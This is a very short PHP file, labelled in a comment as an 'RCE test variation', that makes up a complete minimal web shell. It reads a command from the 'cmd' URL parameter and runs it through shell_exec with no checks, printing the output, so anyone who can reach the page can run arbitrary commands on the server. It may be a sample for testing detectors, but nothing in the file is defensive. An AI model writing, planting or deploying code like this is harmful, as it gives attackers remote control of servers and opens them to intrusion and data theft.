<?php
// RCE test variation #1418
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>